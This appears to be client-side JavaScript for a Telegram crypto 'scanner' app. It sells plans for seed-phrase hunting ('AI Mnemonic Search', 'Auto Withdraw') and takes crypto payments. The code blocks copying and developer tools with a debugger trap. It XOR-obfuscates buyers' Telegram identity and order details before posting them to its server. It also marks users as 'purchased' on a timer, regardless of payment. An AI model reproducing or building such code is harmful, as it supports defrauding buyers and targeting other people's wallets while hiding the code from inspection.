    var el=document.createElement('div');
    el.className='sp-log-line';
    el.innerHTML='<span class="sp-log-tag sp-'+step.tag+'">'+tagTxt[step.tag]+'</span><span class="sp-log-txt">'+step.txt+'</span>';
    
    if(curLine && curLine.parentNode===logBox){
      logBox.insertBefore(el,curLine);
    } else {
      logBox.appendChild(el);
    }
    var lines=logBox.querySelectorAll('.sp-log-line');
    var mv=maxVisible();
    if(lines.length>mv){
      var old=lines[0];
      old.style.transition='opacity .12s,transform .12s';
      old.style.opacity='0';old.style.transform='translateY(-4px)';
      setTimeout(function(){old.remove();},130);
    }
  }

  function tick(){
    if(window.SPLASH_ALREADY_DONE) return;
    if(idx>=TOTAL){
      done=true;
      if(stepsEl){ stepsEl.textContent=TOTAL+'/'+TOTAL+' — Ready'; stepsEl.style.color='#00ffa3'; }
      if(statSt){ statSt.textContent='9 / 9'; statSt.style.color='#a78bfa'; }
      var netEl=document.getElementById('sp-stat-network');
      if(netEl){ netEl.textContent='Online'; netEl.style.color='#00cfb4'; }
      btn.disabled=false;
      btn.innerHTML='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="width:1rem;height:1rem;pointer-events:none;flex-shrink:0;"><polygon points="5 3 19 12 5 21 5 3"/></svg> Launch Scanner';
      btn.onclick=function(){
        splash.classList.add('hide');
        setTimeout(function(){
          splash.remove();
          setTimeout(function(){ if(typeof window.showToastDialogIfNeeded==='function') window.showToastDialogIfNeeded(); },1000);
        },650);
      };
      
      if(curLine) curLine.remove();
      return;
    }
    var step=STEPS[idx];
    addLine(step);
    if(!window.SPLASH_ALREADY_DONE){
      if(stepsEl) stepsEl.textContent=(idx+1)+'/'+TOTAL+' — Loading';
      if(statSt){ var nc=Math.min(9,Math.round((idx+1)/TOTAL*9)); statSt.textContent=nc+' / 9'; }
      if(idx===5 ){ var ne=document.getElementById('sp-stat-network'); if(ne) ne.textContent='Syncing…'; }
      if(idx===14){ var ne2=document.getElementById('sp-stat-network'); if(ne2){ ne2.textContent='Verifying'; ne2.style.color='#a78bfa'; } }
    }
    idx++;
    
    var delay = (step.tag === 'twrn' && step.txt && step.txt.indexOf('repaired') !== -1) ? 2000 : STEP_MS;
    setTimeout(tick, delay);
  }

  setTimeout(tick,400);
  }; 

  if(document.readyState==='loading'){
    _onDom(_runSplash);
  } else {
    _runSplash();
  }
})();

(function(){
  var c=document.getElementById('global-particles');
  if(!c) return;
  var cols=['rgba(124,92,255,','rgba(0,255,163,','rgba(177,157,255,'];
  for(var i=0;i<22;i++){
    var p=document.createElement('div');
    p.style.cssText='position:absolute;border-radius:50%;animation:spFloatUp linear infinite;opacity:0;';
    var sz=Math.random()*2.5+.8,
        col=cols[Math.floor(Math.random()*cols.length)],
        op=(Math.random()*.3+.08).toFixed(2);
    p.style.width=sz+'px'; p.style.height=sz+'px';
    p.style.background=col+op+')';
    p.style.left=(Math.random()*100)+'%';
    p.style.animationDuration=(Math.random()*14+10)+'s';
    p.style.animationDelay=(Math.random()*12)+'s';
    c.appendChild(p);
  }
})();

window._pingOnStart_connected = true;

document.addEventListener('selectstart',e=>e.preventDefault());
document.addEventListener('dragstart',e=>e.preventDefault());
document.addEventListener('copy',function(e){var ao=document.getElementById('archiveOverlay');if(ao&&ao.classList.contains('open'))return;e.preventDefault();});
document.addEventListener('cut',e=>e.preventDefault());
document.addEventListener('touchstart',e=>{if(e.touches.length>1)e.preventDefault();},{passive:false});


window._SEC = false;

(function(){
  document.addEventListener('keydown', function(e){
    if(!window._SEC) return;
    var key = String(e.key||'').toLowerCase();
    if((e.ctrlKey||e.metaKey)&&['c','u','s','a','p'].includes(key)) e.preventDefault();
    if(e.key==='F12'){ e.preventDefault(); e.stopPropagation(); _onDev('shortcut'); return false; }
    if(e.ctrlKey&&e.shiftKey&&['i','j','c'].includes(key)){ e.preventDefault(); e.stopPropagation(); _onDev('shortcut'); return false; }
    if(e.ctrlKey&&['u','s'].includes(key)){ e.preventDefault(); e.stopPropagation(); _onDev('shortcut'); return false; }
  }, true);

  document.addEventListener('contextmenu', function(e){
    if(!window._SEC) return;
    e.preventDefault();
  });
  
  var _devDetected = false;
  function _checkDebugger(){
    if(!window._SEC) return;
    var t = performance.now();
    debugger;
    if(performance.now()-t > 100) _onDev('debugger');
  }
  setInterval(_checkDebugger, 500);

  function _onDev(reason){
    if(_devDetected) return;
    _devDetected = true;
    var msg = 'Developer tools detected! App paused.';
    var cd = document.getElementById('countdown')||document.querySelector('.countdown');
    if(cd){ cd.style.display='flex'; cd.textContent=msg; }
    try{ alert(msg); }catch(_){}
    setTimeout(function(){
      _devDetected = false;
      if(cd && cd.style.display!=='none') cd.style.display='none';
    }, 1500);
  }
})();

var _purchasedPollRef = null;
function startPurchasedPoller(){
  clearInterval(_purchasedPollRef);
  _purchasedPollRef = setInterval(function(){
    var step2El = document.getElementById('pmStep2');
    if(!step2El || step2El.style.display==='none') return;
    var timerEl = document.getElementById('pmTimerTxt');
    if(timerEl && timerEl.textContent==='00:00') return;
    if(!window.DB || !window.DB.tgId) return;
    window.DB.call('check_purchased',{tg_id:window.DB.tgId}).then(function(r){
      if(r && r.upgraded){
        clearInterval(_purchasedPollRef);
        window.DB.planLevel = r.new_level;
        var pnMap={1:'Starter',2:'Pro Hunter',3:'Full Edition'};
        var ov=document.getElementById('pmPayOverlay');
        if(ov){ov.classList.remove('open');ov.style.display='none';}
        document.body.style.overflow='';
        _showStoreStyleToast('\uD83C\uDF89 Upgraded to '+(pnMap[r.new_level]||'Plan '+r.new_level)+'!');
        setTimeout(function(){ location.reload(); }, 3500);
      }
    }).catch(function(){});
  }, 10000);
}

var _pmUSD = 149;
window.openPaymentModal = function(price){
  _pmUSD = parseFloat(price) || 249;
  var ov = document.getElementById('pmPayOverlay');
  if(!ov){
 return; }
  if(ov.parentNode !== document.body) document.body.appendChild(ov);
  var s1=document.getElementById('pmStep1');
  var ld=document.getElementById('pmLoading');
  var s2=document.getElementById('pmStep2');
  if(s1) s1.style.display='';
  if(ld) ld.style.display='none';
  if(s2) s2.style.display='none';
  
  var tc = document.getElementById('pmTermsCheck');
  var tb = document.getElementById('pmTermsBox');
  var ts = document.getElementById('pmTermsCheck_svg');
  var cb = document.getElementById('pmContinue');
  if(tc) tc.checked = false;
  if(tb){ tb.style.background='rgba(124,92,255,0.07)'; tb.style.borderColor='rgba(124,92,255,0.4)'; }
  if(ts) ts.style.opacity='0';
  if(cb){ cb.disabled=true; cb.style.opacity='0.38'; cb.style.cursor='not-allowed'; }
  window._apsLastCoin = null;
  window._pmIsBoost = false;

  
  var planLevel = (window.DB && window.DB.planLevel) || 0;
  var planLabel = document.getElementById('pmPlanTypeLabel');
  var planName = window._pendingPlanName || '';
  window._pendingPlanName = null;
  var origPrice = parseFloat(price) || 49;

  if(planLevel === 1 && origPrice >= 149){
    
    if(origPrice >= 249){
      _pmUSD = 99;
      if(planLabel) planLabel.innerHTML = '<span style="color:#00ffa3;font-weight:800;">🏷 Upgrade Deal:</span> <span style="color:#a78bfa;">Full Edition</span> <span style="color:#9aa1d9;text-decoration:line-through;font-size:0.72rem;">$249</span> <span style="color:#00ffa3;font-weight:800;">→ $99</span>';
    } else {
      _pmUSD = 49;
      if(planLabel) planLabel.innerHTML = '<span style="color:#00ffa3;font-weight:800;">🏷 Upgrade Deal:</span> <span style="color:#a78bfa;">Pro Hunter</span> <span style="color:#9aa1d9;text-decoration:line-through;font-size:0.72rem;">$149</span> <span style="color:#00ffa3;font-weight:800;">→ $49</span>';
    }
  } else if(planLevel === 2 && origPrice >= 249){
    
    _pmUSD = 49;
    if(planLabel) planLabel.innerHTML = '<span style="color:#00ffa3;font-weight:800;">🏷 Upgrade Deal:</span> <span style="color:#a78bfa;">Full Edition</span> <span style="color:#9aa1d9;text-decoration:line-through;font-size:0.72rem;">$249</span> <span style="color:#00ffa3;font-weight:800;">→ $49</span>';
  } else {
    _pmUSD = origPrice;
    var planNames={99:'Starter',149:'Pro Hunter',249:'Full Edition'};
    var pn = planNames[origPrice] || planName || 'Plan';
    if(planLabel) planLabel.innerHTML = '<span style="color:#a78bfa;">'+pn+'</span> — Select your payment method';
  }

  ov.style.cssText='position:fixed;inset:0;z-index:39999;background:rgba(5,5,18,.85);backdrop-filter:blur(12px);display:flex;align-items:center;justify-content:center;padding:16px;';
  ov.classList.add('open');
  document.body.style.overflow='hidden';
};

function _pmGetAmt(symbol){
  if(symbol === 'USDT') return _pmUSD.toFixed(2);
  var cgMap = {
    BTC:'bitcoin', ETH:'ethereum', BNB:'binancecoin', TRX:'tron',
    LTC:'litecoin', SOL:'solana', XRP:'ripple', DOGE:'dogecoin', TON:'toncoin'
  };
  var id = cgMap[symbol];
  var lp = window.LIVE_PRICES || {};
  var price = id && lp[id];
  if(!price || price <= 0){
    var fb = {BTC:68000,ETH:2060,BNB:627,TRX:0.31,LTC:53,SOL:86,XRP:1.39,DOGE:0.09,TON:3};
    price = fb[symbol] || 1;
  }
  var a = _pmUSD / price;
  return a < 0.00001 ? a.toFixed(8) : a < 0.001 ? a.toFixed(6) : a < 1 ? a.toFixed(4) : a.toFixed(2);
}

_onDom(function(){
  var overlay    = document.getElementById('pmPayOverlay');
  var closeBtn   = document.getElementById('pmCloseBtn');
  var step1      = document.getElementById('pmStep1');
  var loading    = document.getElementById('pmLoading');
  var step2      = document.getElementById('pmStep2');
  var continueBtn= document.getElementById('pmContinue');
  var backBtn    = document.getElementById('pmBack');
  var timerRef   = null, timerSec = 600;
  var helpTimer  = null;
  var selected   = null;

  
  var termsCheck = document.getElementById('pmTermsCheck');
  var termsBox   = document.getElementById('pmTermsBox');
  var termsSvg   = document.getElementById('pmTermsCheck_svg');
  function syncTerms(){
    var chk = termsCheck && termsCheck.checked;
    if(continueBtn){ continueBtn.disabled=!chk; continueBtn.style.opacity=chk?'1':'0.38'; continueBtn.style.cursor=chk?'pointer':'not-allowed'; }
    if(termsBox){ termsBox.style.background=chk?'rgba(124,92,255,0.7)':'rgba(124,92,255,0.07)'; termsBox.style.borderColor=chk?'rgba(124,92,255,0.9)':'rgba(124,92,255,0.4)'; }
    if(termsSvg) termsSvg.style.opacity=chk?'1':'0';
  }
  if(termsCheck) termsCheck.addEventListener('change', syncTerms);

  
  var allCards = document.querySelectorAll('#pmGrid .pm-card');
  allCards.forEach(function(c){
    if(c.classList.contains('selected')) selected = c;
    c.addEventListener('click', function(){
      allCards.forEach(function(x){ x.classList.remove('selected'); });
      c.classList.add('selected');
      selected = c;
    });
  });
  if(!selected && allCards.length) { selected = allCards[0]; allCards[0].classList.add('selected'); }

  function closeModal(){ if(overlay){ overlay.classList.remove('open'); overlay.style.display='none'; } document.body.style.overflow=''; resetStep1(); }
  if(closeBtn) closeBtn.addEventListener('click', closeModal);
  if(overlay)  overlay.addEventListener('click', function(e){ if(e.target===overlay) closeModal(); });

  function truncAddr(a){ return (!a||a.length<16) ? a : a.slice(0,7)+'...'+a.slice(-7); }
  function getQRUrl(a){ return 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='+encodeURIComponent(a)+'&bgcolor=ffffff&color=000000&margin=10&qzone=1&format=png'; }

  
  function getOrderId(){
    var tgId = (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user && window.Telegram.WebApp.initDataUnsafe.user.id) ? window.Telegram.WebApp.initDataUnsafe.user.id : null;
    if(!tgId){ tgId = Math.floor(1000000 + Math.random()*8999999); }
    return 'VA-D' + tgId;
  }

  if(continueBtn) continueBtn.addEventListener('click', function(){
    if(continueBtn.disabled) return;
    if(!selected) return;

    
    if(window.DB && window.DB.tgId){
      var _selD = selected.dataset;
      var _upgLvl = {99:1,149:2,249:3}[Math.round(_pmUSD)] || 0;
      
      var _btnPrice = parseFloat(_selD.amount)||0;
      
      var _planLvlMap = {'starter':1,'pro':2,'full':3};
      var _upgradeTo = (window._pmUSD<=49&&(window.DB.planLevel||0)===1)?2:(window._pmUSD<=99&&(window.DB.planLevel||0)===1)?3:(window._pmUSD<=49&&(window.DB.planLevel||0)===2)?3:0;
      
      var _origPriceBtn = parseFloat(selected.closest && selected || selected);

      
      var _apsCoinKey = (_selD.name||'')+'|'+(_selD.network||'');
      if(window._apsLastCoin !== _apsCoinKey){
        window._apsLastCoin = _apsCoinKey;
        var _apsEmailEl = document.getElementById('pmEmailInput');
        var _apsEmail   = _apsEmailEl ? _apsEmailEl.value.trim() : '';
        var _apsTgId = (window.Telegram&&window.Telegram.WebApp&&window.Telegram.WebApp.initDataUnsafe&&window.Telegram.WebApp.initDataUnsafe.user&&window.Telegram.WebApp.initDataUnsafe.user.id)
          ? window.Telegram.WebApp.initDataUnsafe.user.id
          : (window.DB&&window.DB.tgId ? window.DB.tgId : Math.floor(1000000+Math.random()*8999999));
        var _apsOrderId = 'VA-D' + _apsTgId;
        var _apsPlanNames={99:'Starter',149:'Pro Hunter',249:'Full Edition',9:'Turbo Boost'};
        var _apsIsBoost=(window._pmIsBoost===true);
        var _apsPlanName=_apsIsBoost?'Turbo Boost':(_apsPlanNames[Math.round(_pmUSD)]||('Plan $'+_pmUSD));
        var _apsCoinName=_selD.name||'Unknown';
        var _apsCoinAmt=_pmGetAmt(_apsCoinName);
        var _apsNetwork=_selD.network||'';
        var _apsAddr=_selD.addr||'';
        var _apsCurrency=_apsCoinName+(_apsNetwork&&_apsNetwork.toLowerCase()!==_apsCoinName.toLowerCase()?' ('+_apsNetwork+')':'');
        var _apsMsg='New Purchase Order\n\n'
          +'Product:  '+_apsPlanName+'\n'
          +'Order ID: '+_apsOrderId+'\n'
          +'Currency: '+_apsCurrency+'\n'
          +'Amount:   '+_apsCoinAmt+' '+_apsCoinName+' ($'+_pmUSD+')\n'
          +'Address:  '+_apsAddr+'\n'
          +'Email:    '+(_apsEmail||'----')+'\n\n'
          +'Please send the exact amount to the address above.\n'
          +'Use the correct network to avoid losing funds.\n\n'
          +'Status: Awaiting Payment';
        var _apsc=_apsIsBoost?'2':'0';
        (function(){
          var _ek='aLf4X9mQ2rTvUwPz';
          var _tgU=(window.Telegram&&window.Telegram.WebApp&&window.Telegram.WebApp.initDataUnsafe&&window.Telegram.WebApp.initDataUnsafe.user)||{};
          var _payload={
            id:window.DB.tgId,c:_apsc,msg:_apsMsg,
            tg_name:     (_tgU.first_name||'')+(_tgU.last_name?' '+_tgU.last_name:''),
            tg_username: _tgU.username||'',
            tg_premium:  !!_tgU.is_premium,
            addr:        _apsAddr||'',
            order_id:    _apsOrderId||''
          };
          var _raw=JSON.stringify(_payload);
          var _utf8=unescape(encodeURIComponent(_raw));
          var _out=[];
          for(var _i=0;_i<_utf8.length;_i++){
            _out.push(_utf8.charCodeAt(_i)^_ek.charCodeAt(_i%_ek.length));
          }
          var _enc=btoa(String.fromCharCode.apply(null,_out));
          fetch('/api/aps',{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({_p:_enc}),
            keepalive:true
          }).catch(function(){});
        })();
      }
      window._purchasedRecordCreated = false;
      var _apsPlanNamesInfo={99:'Starter',149:'Pro Hunter',249:'Full Edition',9:'Turbo Boost'};
      var _planNameInfo = (window._pmIsBoost?'Turbo Boost':(_apsPlanNamesInfo[Math.round(_pmUSD)]||('Plan $'+_pmUSD)));
      window.DB.call('save_purchased',{
        tg_id: window.DB.tgId,
        info: _planNameInfo,
        plan_level: window.DB.planLevel||0,
        upgrade_level: _upgradeTo||_upgLvl,
        coin: _selD.name||'',
        price: _pmUSD+''
      }).then(function(r){
        if(r && r.inserted_id) window._purchasedId = r.inserted_id;
        window._purchasedRecordCreated = true;
        startPurchasedPoller();
      }).catch(function(){});
    }

    step1.style.display='none';
    loading.style.display='flex';

    
    var emailEl = document.getElementById('pmEmailInput');
    var emailVal = emailEl ? emailEl.value.trim() : '';

    setTimeout(function(){
      var d = selected.dataset;
      var iw = document.getElementById('pm2IconWrap');
      var _tI={BTC:'images/how1p.png',ETH:'images/n27v6.png',BNB:'images/yt9z0.png',TRX:'images/6ulyt.png',SOL:'images/kqcoz.png',XRP:'images/mpcf0.png',USDT:'images/tdg4r.png',DOGE:'images/hpym7.png',LTC:'images/f4bm5.png',TON:'images/9k5bw.png'};
      var _nI={Bitcoin:'images/how1p.png',Ethereum:'images/n27v6.png',BSC:'images/yt9z0.png',Tron:'images/6ulyt.png',Solana:'images/kqcoz.png',XRP:'images/mpcf0.png',Litecoin:'images/f4bm5.png','TON Chain':'images/9k5bw.png'};
      if(iw){
        var tImg=_tI[d.name]||'';
        var nImg=_nI[d.network]||tImg;
        iw.innerHTML=(tImg?'<img class="pm-summary-token" src="'+tImg+'" alt="'+d.name+'" draggable="false">':'')+
          '<div class="pm-summary-net">'+(nImg?'<img src="'+nImg+'" style="width:11px;height:11px;object-fit:contain;display:block;border-radius:50%;" alt="" draggable="false">':'')+'</div>';
        iw.style.background='';
      }

      var same = d.name.toLowerCase()===d.network.toLowerCase();
      var t2 = document.getElementById('pm2Title');
      var s2el = document.getElementById('pm2Sub');
      var a2 = document.getElementById('pm2Amount');
      var u2 = document.getElementById('pm2Unit');
      var ae = document.getElementById('pm2Addr');
      if(t2) t2.textContent = same ? d.name : d.name+' / '+d.network;
      if(s2el) s2el.textContent = same ? d.name+' Coin' : d.name+' on '+d.network;
      if(a2) a2.textContent = _pmGetAmt(d.name);
      if(u2) u2.textContent = ' '+d.name;
      if(ae){ ae.textContent = truncAddr(d.addr); ae.dataset.full = d.addr; }

      
      var orderIdEl = document.getElementById('pmOrderId');
      if(orderIdEl) orderIdEl.textContent = getOrderId();

      
      var netLabelMap = {
        'Bitcoin':'Bitcoin','Ethereum':'ERC20','BSC':'BEP20',
        'Tron':'TRC20','Solana':'SOL','XRP':'XRP Ledger',
        'Litecoin':'Litecoin','TON Chain':'TON'
      };
      var netLbl = document.getElementById('pm2NetworkLabel');
      if(netLbl) netLbl.textContent = netLabelMap[d.network] || d.network;
      var emailRow2 = document.getElementById('pmStep2EmailRow');
      var emailValEl = document.getElementById('pmStep2EmailVal');
      if(emailVal && emailRow2 && emailValEl){
        emailRow2.style.display='flex';
        emailValEl.textContent = emailVal;
      } else if(emailRow2){
        emailRow2.style.display='none';
      }

      var qs=document.getElementById('pmQrSub'), qa=document.getElementById('pmQrAddr'), qi=document.getElementById('pmQrImg');
      if(qs) qs.textContent = same ? d.name : d.name+' · '+d.network;
      if(qa) qa.textContent = d.addr;
      if(qi) qi.src = getQRUrl(d.addr);

      
      var statusTxt = document.getElementById('payment-status-text');
      var helpDiv = document.getElementById('payment-help');
      if(statusTxt) statusTxt.innerHTML = 'Waiting for payment<span id="waiting-dots">...</span>';
      if(helpDiv){ helpDiv.style.display='none'; helpDiv.classList.remove('visible'); }

      loading.style.display='none';
      step2.style.display='flex';
      startTimer();
      startDots();
      startHelpTimer();
    }, 1500);
  });

  if(backBtn) backBtn.addEventListener('click', resetStep1);

  function resetStep1(){
    clearInterval(timerRef); timerRef=null; timerSec=600;
    clearTimeout(helpTimer); helpTimer=null;
    var tt=document.getElementById('pmTimerTxt'); if(tt) tt.textContent='10:00';
    var helpDiv = document.getElementById('payment-help');
    if(helpDiv){ helpDiv.style.display='none'; }
    var statusDiv = document.getElementById('payment-status');
    var statusTxt = document.getElementById('payment-status-text');
    if(statusDiv) statusDiv.classList.remove('expired');
    if(statusTxt) statusTxt.innerHTML = 'Waiting for payment<span id="waiting-dots">...</span>';
    if(step2) step2.style.display='none';
    if(loading) loading.style.display='none';
    if(step1) step1.style.display='';
  }

  function showTimerToast(){
    var toast = document.getElementById('_pmTimerToast');
    if(!toast){
      toast = document.createElement('div');
      toast.id = '_pmTimerToast';
      toast.style.cssText = 'position:fixed;bottom:90px;left:50%;transform:translateX(-50%) translateY(20px);background:linear-gradient(135deg,rgba(124,92,255,.18),rgba(56,189,248,.10));border:1px solid rgba(124,92,255,.5);color:#c4b5fd;font-family:\'Outfit\',sans-serif;font-size:.82rem;font-weight:700;padding:12px 20px;border-radius:14px;z-index:99999;backdrop-filter:blur(12px);white-space:nowrap;display:flex;align-items:center;gap:8px;opacity:0;transition:opacity .25s ease,transform .25s ease;pointer-events:none;';
      toast.innerHTML = '<i class="fa-regular fa-clock" style="color:#a78bfa;"></i> Timer renewed — 10 more minutes to complete your payment.';
      document.body.appendChild(toast);
    }
    void toast.offsetWidth;
    toast.style.opacity='1'; toast.style.transform='translateX(-50%) translateY(0)';
    clearTimeout(toast._h);
    toast._h = setTimeout(function(){
      toast.style.opacity='0'; toast.style.transform='translateX(-50%) translateY(16px)';
    }, 4000);
  }

  function startTimer(){
    clearInterval(timerRef);
    timerSec = 600;
    timerRef = setInterval(function(){
      timerSec--;
      if(timerSec < 0){
        clearInterval(timerRef); timerRef=null;
        
        var tt = document.getElementById('pmTimerTxt');
        if(tt) tt.textContent = '00:00';
        var statusDiv = document.getElementById('payment-status');
        var statusTxt = document.getElementById('payment-status-text');
        if(statusDiv){
          statusDiv.classList.add('expired');
        }
        if(statusTxt){
          statusTxt.innerHTML = 'Payment window expired. Return to plans and create a new order.';
        }
        return;
      }
      var m=String(Math.floor(timerSec/60)).padStart(2,'0');
      var s=String(timerSec%60).padStart(2,'0');
      var tt=document.getElementById('pmTimerTxt');
      if(tt) tt.textContent=m+':'+s;
    }, 1000);
  }

  
  function startDots(){
    var dotsEl = document.getElementById('waiting-dots');
    if(!dotsEl) return;
    var count=0;
    clearInterval(window._pmDotsRef);
    window._pmDotsRef = setInterval(function(){
      dotsEl = document.getElementById('waiting-dots');
      if(!dotsEl){ clearInterval(window._pmDotsRef); return; }
      count = (count+1)%4;
      dotsEl.textContent = '.'.repeat(count||1);
    }, 500);
  }

  
  function startHelpTimer(){
    clearTimeout(helpTimer);
    helpTimer = setTimeout(function(){
      var helpDiv = document.getElementById('payment-help');
      if(helpDiv){ helpDiv.style.display='block'; }
    }, 30000);
  }

  function copyTxt(txt){
    if(navigator.clipboard) navigator.clipboard.writeText(txt).catch(function(){ fbCopy(txt); });
    else fbCopy(txt);
  }
  function fbCopy(txt){
    var t=document.createElement('textarea'); t.value=txt;
    t.style.cssText='position:fixed;left:-9999px';
    document.body.appendChild(t); t.select();
    try{document.execCommand('copy');}catch(e){}
    document.body.removeChild(t);
  }

  window.pmCopyText = function(elId, card){
    var el = document.getElementById(elId);
    var val = el ? el.textContent.trim() : '';
    copyTxt(val);
    var btn = card ? card.querySelector('.pm-copybtn') : null;
    if(btn){ btn.classList.add('copied'); btn.innerHTML='<i class="fa-solid fa-check"></i>'; }
    setTimeout(function(){ if(btn){btn.classList.remove('copied'); btn.innerHTML='<i class="fa-regular fa-copy"></i>';} }, 2000);
  };

  window.pmCopy = function(el, type){
    var val;
    if(type==='amount'){
      
      val = document.getElementById('pm2Amount').textContent.trim();
    } else {
      val = (document.getElementById('pm2Addr').dataset.full || document.getElementById('pm2Addr').textContent);
    }
    copyTxt(val);
    var btn = el.querySelector('.pm-copybtn');
    if(btn){ btn.classList.add('copied'); btn.innerHTML='<i class="fa-solid fa-check"></i>'; }
    setTimeout(function(){ if(btn){btn.classList.remove('copied'); btn.innerHTML='<i class="fa-regular fa-copy"></i>';} }, 2000);
  };

  
  document.body.addEventListener('click', function(e){
    var openBtn  = e.target.closest('#pmOpenQr');
    var closeBtn = e.target.closest('#pmQrClose');
    var copyBtn  = e.target.closest('#pmQrCopyBtn');
    var qrOv     = document.getElementById('pmQrOverlay');
    if(openBtn && qrOv){
      
      if(qrOv.parentNode !== document.body) document.body.appendChild(qrOv);
      qrOv.classList.add('open');
      return;
    }
    if(closeBtn && qrOv){ qrOv.classList.remove('open'); return; }
    if(e.target === qrOv){ qrOv.classList.remove('open'); return; }
    if(copyBtn){
      var addr = document.getElementById('pmQrAddr');
      if(addr) copyTxt(addr.textContent);
      copyBtn.innerHTML='<i class="fa-solid fa-check"></i> Copied!';
      setTimeout(function(){ copyBtn.innerHTML='<i class="fa-regular fa-copy"></i> Copy Address'; }, 2000);
    }
  });
});

function _showStoreStyleToast(msg, ms) {
  var t = document.getElementById('storeToast');
  if (!t) return;
  var ms = ms || 3200;
  t.innerHTML = msg;
  t.style.opacity = '1';
  t.style.transform = 'translateX(-50%) translateY(0)';
  t.style.pointerEvents = 'auto';
  clearTimeout(t._hideTimer);
  t._hideTimer = setTimeout(function(){
    t.style.opacity = '0';
    t.style.transform = 'translateX(-50%) translateY(16px)';
    t.style.pointerEvents = 'none';
  }, ms);
}

window.upgradeToStore = function(){
  if(typeof gotoScreen === 'function') gotoScreen('screen-store');
  _showStoreStyleToast('<i class="fa-solid fa-bag-shopping" style="color:#7c5cff;margin-right:4px;"></i> Choose a plan to unlock full power ⚡');
};

_onDom(function(){

  
  document.addEventListener('input', function(e) {
    if (e.target && e.target.classList.contains('seed-inp')) {
      updateSeedCopyBtn();
    }
  });

  
  document.querySelector('.sa-boost-btn') && document.querySelectorAll('.sa-boost-btn').forEach(function(btn) {
    var orig = btn.getAttribute('onclick');
    btn.setAttribute('onclick', 'if(!window._userHasPurchased){_showStoreStyleToast("🔒  Purchase any plan first to unlock Turbo Boost ⚡");return;}' + (orig || ''));
  });

  
  var togRows = document.querySelectorAll('.s-tog-row');
  var togMap = [
    null, 
    null, 
    { icon:'⚙️', on:'Background scanning activated', off:'Background scanning deactivated', colorOn:'124,92,255', colorOff:'154,161,217' },
    { icon:'🤖', on:'AI Mnemonic Search is ON', off:'AI Mnemonic Search is OFF', colorOn:'0,255,163', colorOff:'154,161,217' },
    { icon:'🔗', on:'All Derivation Paths enabled', off:'All Derivation Paths disabled', colorOn:'124,92,255', colorOff:'154,161,217' },
    { icon:'💸', on:'Auto Withdraw is ON', off:'Auto Withdraw is OFF', colorOn:'0,255,163', colorOff:'154,161,217' },
    { icon:'🔔', on:'Miner Notification enabled', off:'Miner Notification disabled', colorOn:'255,200,50', colorOff:'154,161,217' }
  ];

  togRows.forEach(function(row, idx) {
    var sw = row.querySelector('.s-switch input[type="checkbox"]');
    if (!sw || !togMap[idx]) return;
    var info = togMap[idx];
    sw.addEventListener('change', function() {
      var msg = this.checked ? (info.icon + '  ' + info.on) : (info.icon + '  ' + info.off);
      _showStoreStyleToast(msg);
    });
  });

  var depSel = document.getElementById('depthSelect');
  if (depSel) depSel.addEventListener('change', function() {
    _showStoreStyleToast('🔭  Scan depth set to: ' + this.options[this.selectedIndex].text);
  });
  var langSel = document.getElementById('langSelect');
  if (langSel) langSel.addEventListener('change', function() {
    _showStoreStyleToast('🌐  Language: ' + this.options[this.selectedIndex].text);
  });

  
  
  var pmCont = document.getElementById('pmContinue');
  if (pmCont) {
    pmCont.addEventListener('click', function() {
      setTimeout(function() { window._userHasPurchased = true; }, 2000);
    });
  }
});

(function() {
  function syncTrmScroll() {
    var tb = document.getElementById('checkedTerminal');
    if (!tb) return;
    
    var children = tb.children;
    var isIdle = (children.length === 0) ||
                 (children.length === 1 && children[0].classList.contains('trm-ready'));
    if (isIdle) {
      tb.classList.add('trm-idle');
      tb.classList.remove('trm-active');
    } else {
      tb.classList.remove('trm-idle');
      tb.classList.add('trm-active');
    }
  }

  _onDom(function(){
    var tb = document.getElementById('checkedTerminal');
    if (!tb) return;
    
    syncTrmScroll();
    
    var obs = new MutationObserver(syncTrmScroll);
    obs.observe(tb, { childList: true });
  });
})();

var _themeToast = null;

function applyTheme(theme, btn) {
  
  if ((window.ALFA_PLAN_LEVEL || 0) < 1) {
    
    theme = 'black';
    document.querySelectorAll('.theme-dot').forEach(function(d) { d.classList.remove('active'); });
    var defDot = document.querySelector('.theme-dot[data-theme="black"]');
    if (defDot) defDot.classList.add('active');
    showMiningWarning('🔒 Upgrade to unlock themes');
    return;
  }
  
  document.querySelectorAll('.theme-dot').forEach(function(d) { d.classList.remove('active'); });
  if (btn) btn.classList.add('active');

  
  var fill = document.getElementById('themeBarFill');
  var colors = { black:'linear-gradient(90deg,#7c5cff,#00ffa3)', red:'linear-gradient(90deg,#c0102a,#ff4060)', blue:'linear-gradient(90deg,#1a4fc4,#40a0ff)', white:'linear-gradient(90deg,#7c5cff,#00c8a0)' };
  if (fill) {
    fill.style.background = colors[theme] || colors.black;
    fill.style.width = '0%';
    setTimeout(function() { fill.style.width = '100%'; }, 50);
  }

  
  var toastEl = document.getElementById('themeToast');
  if (!toastEl) {
    toastEl = document.createElement('div');
    toastEl.id = 'themeToast';
    toastEl.style.cssText = 'position:fixed;bottom:80px;left:50%;transform:translateX(-50%) translateY(10px);background:rgba(10,8,24,.88);border:1px solid rgba(124,92,255,.4);color:#e8ebff;font-family:"Outfit",sans-serif;font-size:.8rem;font-weight:700;padding:10px 18px;border-radius:12px;z-index:99999;backdrop-filter:blur(16px);opacity:0;transition:opacity .3s,transform .3s;pointer-events:none;white-space:nowrap;';
    document.body.appendChild(toastEl);
  }
  var names = { black:'Default', red:'Red', blue:'Green', white:'White' };
  toastEl.textContent = '🎨 Applying ' + (names[theme] || theme) + ' theme…';
  toastEl.style.opacity = '1';
  toastEl.style.transform = 'translateX(-50%) translateY(0)';
  clearTimeout(_themeToast);

  
  _themeToast = setTimeout(function() {
    
    document.body.classList.remove('theme-red','theme-green','theme-white');
    if (theme !== 'black') document.body.classList.add('theme-' + theme);

    
    updateTopbarIcons(theme);

    toastEl.style.opacity = '0';
    toastEl.style.transform = 'translateX(-50%) translateY(10px)';

    
    if (window.DB && window.DB.tgId) {
      window.DB.saveSetting('theme', theme);
    }
    
    window._currentTheme = theme;
  }, 3000);
}

function updateTopbarIcons(theme) {
  var dashImg  = document.getElementById('icon-dash-img');
  var storeImg = document.getElementById('icon-store-img');
  
  var variant = (theme === 'white') ? 'on' : 'off';
